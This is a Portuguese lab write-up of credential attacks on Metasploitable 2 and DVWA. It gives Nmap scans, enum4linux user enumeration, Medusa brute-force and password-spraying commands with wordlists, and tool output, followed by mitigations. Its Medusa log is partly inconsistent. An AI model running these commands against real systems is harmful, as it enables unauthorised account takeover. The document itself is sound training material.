# Laboratório de Força Bruta com Medusa e Kali Linux

## 1. Sobre o Projeto

Este laboratório foi realizado em ambiente controlado e autorizado, com foco em testes de segurança em serviços vulneráveis e autenticação. O objetivo foi demonstrar o uso de ferramentas de reconhecimento, automação e validação em um cenário de estudo e documentação.

## 2. Objetivos

- Compreender ataques de força bruta;
- Utilizar Kali Linux e Medusa;
- Realizar testes contra FTP;
- Realizar automação de tentativas contra aplicação Web/DVWA;
- Realizar password spraying em SMB;
- Enumerar usuários;
- Validar acessos;
- Identificar riscos;
- Propor medidas de mitigação;
- Documentar o laboratório para utilizar como portfólio.

## 3. Ambiente do Laboratório

| Item | Detalhes |
|---|---|
| Máquina atacante | Kali Linux |
| Sistema operacional | kali linux  |
| Ferramentas | Medusa e Nmap |
| Máquina alvo | Metasploitable 2 |
| Sistema operacional | Ubuntu 8.04|
| Serviços analisados |	FTP, SSH, SMB  |
| Tipo de rede |Rede interna  |
| Virtualizador | VirtualBox |


## 4. Ferramentas Utilizadas

| Ferramenta | Finalidade |
|---|---|
| Kali Linux | Ambiente atacante |
| Nmap | Reconhecimento de portas e serviços |
| Medusa | Força bruta e password spraying |
| FTP | Serviço analisado |
| SMB | Serviço analisado |
| DVWA | Aplicação web vulnerável para testes |
| VirtualBox | Virtualização do laboratório |

### 5. Identificação do endereço IP

Foi realizado o reconhecimento inicial para identificar os endereços IP das máquinas do laboratório e confirmar a conectividade.

```bash
"ip a" para identificar o ip de cada maquina, e "ping -c 3" (ip maquina alvo) para testar conectividade 
```

ip maquina atacante: 192.168.1.190

ip maquina alvo: 192.168.1.223

### 6. Varredura com Nmap

A varredura foi realizada para identificar portas abertas e serviços em execução.

```bash
"nmap -sV -v -p- 192.168.1.223"
```
Foi realizada uma varredura abrangente das **65.535 portas TCP** disponíveis no host, com o objetivo de identificar os serviços expostos e possíveis pontos de entrada.
Após o reconhecimento, a análise foi concentrada nos principais serviços abordados no desafio, especialmente nas portas **21 (FTP), 80 (HTTP) e 445 (SMB)**, por apresentarem serviços relevantes para os testes de segurança realizados.

| Porta | Serviço | Estado | Versão |
|---|---|---|---|
| 21 | FTP | Open | vsftpd 2.3.4 |
| 80 | HTTP | Open | Apache 2.2.8|
| 139 | netbios-ssn| Open | Samba|
| 445 | netbios-ssn| Open| Samba|


Ressalva: Durante o reconhecimento do Metasploitable 2, também foi identificada a porta 1524/tcp (bindshell), associada a um serviço de shell remoto/backdoor. Isso reforça a importância de verificações periódicas das portas abertas, para garantir que apenas serviços realmente necessários estejam disponíveis reduzindo a exposição desnecessária do sistema

## 7. Ataque de Força Bruta contra FTP

O FTP é um protocolo de transferência de arquivos que utiliza autenticação por usuário e senha. Quando configurado de forma inadequada, pode ser alvo de ataques automatizados.

### 7.1 Wordlist

A lista de usuários e senhas foi utilizada conforme a execução do laboratório.

```text
"echo -e "user\nmsfadmin\nadmin\nroot\nadministrator\nftp\nanonymous\ntest\nguest\npostgres\nmysql" > usuarios.txt"
e "echo -e "123456\npassword\nqwerty\nmsfadmin\nadmin\nroot\ntoor\n12345678\n12345\npassword123\nadmin123\nletmein\nguest\nftp\nanonymous\n" > senhas.txt"
```
Vulnerabilidade Observada no FTP:
O metasploitable 2 utiliza a versão "VSFTPD 2.3.4", um servidor FTP que apresenta uma vulnerabilidade conhecida pela a presença de um "backdoor", capaz de possibilitar a execução remota de comandos no sistema possibilitando assim o individuo malicioso receber um "shell" por exemplo. Além dessa vulnerabilidade, o ambiente utiliza de credenciais padrão e fracas, como "msfadmin" tanto para usuário tanto para senha que podem ser utilizadas para demonstrar os riscos de autenticações com senhas previsíveis. Esse cenário demonstra a importância de manter os serviços atualizados, remover versões vulneráveis e utilizar credenciais fortes.


### 7.2 Execução do Medusa

```bash
"medusa -h 192.168.1.223 -U usuarios.txt -P senhas.txt -M ftp -t 6"
```

Explicação dos parâmetros:
- `-h`: host/endpoint do alvo;
- `-U`: arquivo com usuários;
- `-P`: arquivo com senhas;
- `-M ftp`: módulo FTP do Medusa;


### 7.3 Validação da credencial

Após a identificação de possível credencial válida, foi realizada validação.

```bash
"ftp 192.168.1.223" seguido do usuario e senha msfadmin:msfadmin
```

## 8. Password Spraying e SMB

A diferença entre essas técnicas são:

- Brute force: múltiplas tentativas para um único usuário;
- Password spraying: uma mesma senha em vários usuários;
- Credential stuffing: reutilização de credenciais vazadas.

### 8.1 Enumeração de usuários

Objetivo: identificar contas válidas antes do teste de senha.

```bash
"enum4linux -a 192.168.1.223"
```

### Evidência — Enumeração de usuários

A execução do `enum4linux` permitiu identificar diversas contas existentes no sistema Metasploitable 2 por meio do serviço SMB. Entre os usuários encontrados estão contas de sistema, serviços e usuários utilizados pelo ambiente.

```text
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
```

A enumeração demonstra que o serviço SMB pode fornecer informações sobre as contas existentes dentro do sistema. Esse tipo de informação pode ser útil em uma avaliação de segurança, pois permite conhecer possíveis nomes de usuários antes de realizar algum de autenticação.


### 8.2 Password Spraying

```bash
Primeiro foi criada uma wordlist personalizada com os usuários encontrados durante a enumeração do SMB e, em seguida, uma lista com possíveis senhas.
"echo -e "games\nnobody\nbind\nproxy\nsyslog\nuser\nwww-data\nroot\nnews\npostgres\nbin\nmail\ndistccd\nproftpd\ndhcp\ndaemon\nsshd\nman\nlp\nmysql\ngnats\nlibuuid\nbackup\nmsfadmin\ntelnetd\nsys\nklog\npostfix\nservice\nlist\nirc\nftp\ntomcat55\nsync\nuucp" > usuarios_smb.txt"

"echo -e "password\n123456\nWelcome123\nmsfadmin\nadmin\nroot\ntoor\n12345678\n" > senhas_smb.txt"

comando utilizado para o teste de autenticação "medusa -h 192.168.1.223 -U usuarios_smb.txt -P senhas_smb.txt -M smbnt -t 2 -T 50"
```

Após o teste de autenticação o medusa retorna o usuário e senha que no caso novamente é msfadmin:msfadmin e também retorna um possível privilegio administrador possuído por esse usuário podemos testar isso utilizando o comando "smbclient -L //192.168.1.223 -U msfadmin" e utilizando a senha que foi descoberta.

## 9. Ataque Automatizado contra DVWA

O DVWA é uma aplicação web vulnerável, utilizada em ambientes de estudo para simular autenticação e testes de segurança em aplicações web.

### 9.1 Configuração

- URL utilizada: http://192.168.1.223/dvwa/login.php
- nível de segurança configurado:Low

### 9.2 Teste de autenticação

```bash
Primeiro foi configurado uma wordlist para usuarios e senhas 
"echo -e "admin\nuser\ntest\nguest\nadministrator" > dvwa_users.txt"
"echo -e "password\nadmin\n123456\npassword123\n12345678" > dvwa_pass.txt"
e o comando para testar os campos de login: medusa -h 192.168.1.223 -U dvwa_users.txt -P dvwa_pass.txt -M http \
-m PAGE:"/dvwa/login.php" \
-m FORM:"username=^USER^&password=^PASS^&Login=Login" \
-m FAIL:"Login failed" -t 6
```

```text
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: admin (1 of 5, 1 complete) Password: password (1 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: admin Password: password [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: user (2 of 5, 2 complete) Password: admin (1 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: user Password: admin [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: test (3 of 5, 3 complete) Password: password (1 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: test Password: password [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: admin (1 of 5, 4 complete) Password: admin (2 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: admin Password: admin [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: guest (4 of 5, 5 complete) Password: password (1 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: guest Password: password [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: guest (4 of 5, 6 complete) Password: admin (2 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: guest Password: admin [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: administrator (5 of 5, 7 complete) Password: password (1 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: administrator Password: password [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: administrator (5 of 5, 8 complete) Password: admin (2 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: administrator Password: admin [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: user (2 of 5, 9 complete) Password: password (2 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: user Password: password [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: admin (1 of 5, 10 complete) Password: password123 (3 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: admin Password: password123 [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: admin (1 of 5, 11 complete) Password: 123456 (4 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: admin Password: 123456 [SUCCESS]
2026-10-29 13:10:14 ACCOUNT CHECK: [http] Host: 192.168.1.223 (1 of 1, 0 complete) User: admin (1 of 5, 12 complete) Password: password (5 of 5 complete)
2026-10-29 13:10:14 ACCOUNT FOUND: [http] Host: 192.168.1.223 User: admin Password: 1234556 [SUCCESS]
````
Durante o teste de autenticação, a ferramenta **Medusa** identificou uma credencial válida, **admin:password**. Para a análise dos resultados, se considera apenas o primeiro registro apresentado como **FOUND**, indicando a identificação da combinação correta. Os resultados posteriores marcados como **SUCCESS** podem ocorrer devido ao comportamento da aplicação durante as tentativas seguintes de autenticação.

## 10. Resultados Gerais

| Cenário | Serviço | Técnica | Resultado |
|---|---|---|---|
| 1 | FTP | Brute Force | Identificação de credenciais válidas, confirmação de acesso ao serviço FTP e vulnerabilidade de execuçao de codigo remoto encontrada|
| 2 | SMB | Password Spraying | Enumeração de usuários e identificação de credenciais válidas para autenticação  |
| 3 | DVWA | Tentativas automatizadas |Identificação de credenciais válidas e confirmação de autenticação na aplicação web  |

## 11. Análise de Segurança

Principais riscos observados no laboratório:

- credenciais fracas e previsiveis;
- ausência de bloqueio de conta após múltiplas tentativas;
- ausência de rate limiting nos mecanismos de autenticação;
- serviços expostos e desatualizados com vulnerabilidades já conhecidas;
- possibilidade de enumeração de usuários;
- ausência de monitoramento;
- risco de acesso indevido em caso de credenciais válidas.

## 12. Medidas de Mitigação

- Aplicar políticas fortes de senha;
- Ativar bloqueio após múltiplas falhas;
- Implementar rate limiting;
- Limitar serviços expostos;
- atualizar ou migrar para serviços mais seguros;
- Reduzir enumeração de usuários;
- Usar MFA quando possível;
- Monitorar logs e acessos;
- Revisar permissões e controles de acesso;
- Validar aplicações web em ambientes controlados.

## 13. Considerações Finais

A realização deste laboratório permitiu colocar em prática diferentes etapas de uma análise de segurança, desde a identificação de portas e serviços com o Nmap até a enumeração de usuários e os testes de autenticação utilizando Medusa e Enum4linux.
Durante os testes, foi possível observar na prática como credenciais fracas, serviços vulneráveis e a falta de mecanismos de proteção podem facilitar tentativas de acessos não autorizados. Também foi possível compreender melhor a importância de identificar esses riscos e aplicar medidas de segurança adequadas.
Além da parte técnica, o laboratório contribuiu para desenvolver melhor a capacidade de interpretar os resultados obtidos, registrar evidências e documentar cada etapa do processo de forma organizada.
Todo o procedimento foi realizado em um ambiente controlado e autorizado, exclusivamente para fins educacionais, permitindo aplicar os conhecimentos estudados e registrar a experiência como parte do desenvolvimento do portfólio em cibersegurança.

